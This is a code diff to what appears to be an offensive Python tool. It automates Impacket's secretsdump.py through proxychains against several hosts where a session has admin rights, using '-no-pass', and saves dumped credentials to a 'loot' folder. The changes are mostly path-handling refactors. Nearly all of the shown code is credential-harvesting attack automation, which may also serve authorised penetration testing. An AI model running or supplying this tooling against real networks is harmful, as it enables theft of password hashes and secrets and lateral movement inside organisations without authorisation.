@@ -46,7 +46,6 @@ def config_check():
     except FileNotFoundError as e:
         fail += 1
 
-
     if fail == 1:
         print('{} ERROR you are missing proxychains config'.format(red_minus))
         sys.exit(1)
@@ -59,10 +58,11 @@ def config_check():
 
 
 def mt_execute(username, ip):
-    os.system('sudo proxychains python3 secretsdump.py {}:\'\'@{} -no-pass -outputfile \'{}/loot/{}\''.format(username, ip, cwd, ip))
+    os.system('sudo proxychains python3 {}/secretsdump.py {}:\'\'@{} -no-pass -outputfile \'{}/loot/{}\''.format(cwd, username, ip, cwd, ip))
     with open('dumped_ips', 'a') as f:
         f.write(ip + '\n')
         f.close()
+
 
 if __name__ == '__main__':
 
@@ -70,12 +70,12 @@ if __name__ == '__main__':
         print("{} Must be run as sudo".format(red_exclm))
         sys.exit(1)
 
-    if os.path.isdir(cwd + "/loot") == False:
-        os.makedirs(cwd + "/loot")
+    if os.path.isdir("{}/loot".format(cwd)) == False:
+        os.makedirs("{}/loot".format(cwd))
 
     config_check()
 
-    if os.path.isfile('secretsdump.py') == False:
+    if os.path.isfile('{}/secretsdump.py'.format(cwd)) == False:
         print('Missing secretsdump.py in current directory')
         sys.exit(1)
 
@@ -107,10 +107,10 @@ if __name__ == '__main__':
 
             # dat[0] = protocol dat[1] = ip dat[2] = domain/username dat[3] = adminstatus
 
-            if os.path.isdir(cwd + "/loot") == False:
-                os.makedirs(cwd + "/loot")
-            
-            with concurrent.futures.ProcessPoolExecutor(max_workers=5) as executor: # multithreading yeahhhh
+            if os.path.isdir("{}/loot".format(cwd)) == False:
+                os.makedirs("{}/loot".format(cwd))
+
+            with concurrent.futures.ProcessPoolExecutor(max_workers=5) as executor:  # multithreading yeahhhh
                 for item in tmp:
                     dat = item.replace(']', '').split(',')
                     if dat[3] == 'TRUE':
